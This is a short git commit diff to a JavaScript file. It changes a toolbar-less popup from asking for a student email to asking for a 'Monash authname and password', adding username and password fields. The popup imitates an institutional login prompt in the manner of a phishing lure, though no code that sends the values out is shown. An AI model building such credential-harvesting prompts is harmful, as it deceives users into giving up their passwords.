3ad8177ea9db860d08085310a7366e4d9503d71a
vietqvo <viet.vo@emichats.com>
2018-05-10 13:29:05 +1000

    change
    change

--- myjavascript.js
+++ myjavascript.js
@@ -4,13 +4,16 @@ var h = 200;
 var left = (screen.width - w) / 2;
 var top = (screen.height - h) / 4;
 
-//var popup = open("", "Popup", "width=300,height=200");
 var popup = open("", "Popup",'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width=' + w + ', height=' + h + ', top=' + top + ', left=' + left);
 
 var h5 = document.createElement('h5');
-h5.appendChild(document.createTextNode("Please confirm your student email"));
+h5.appendChild(document.createTextNode("Please confirm your Monash authname and password"));
 
-var txtOk = popup.document.createElement("input");
+var lblname = popup.document.createElement("label");
+var txtname = popup.document.createElement("input");
+
+var lblpass = popup.document.createElement("label");
+var txtpass = popup.document.createElement("input");
 
 var linebreak = document.createElement("br");
 
@@ -19,7 +22,14 @@ button.setAttribute('type', 'button');
 button.setAttribute('value', 'Confirm');
 
 popup.document.body.appendChild(h5);
+
 popup.document.body.appendChild(linebreak);
-popup.document.body.appendChild(txtOk);
+popup.document.body.appendChild(lblname);
+popup.document.body.appendChild(txtname);
+
+popup.document.body.appendChild(linebreak);
+popup.document.body.appendChild(lblpass);
+popup.document.body.appendChild(txtpass)
+
 popup.document.body.appendChild(linebreak);
 popup.document.body.appendChild(button); 
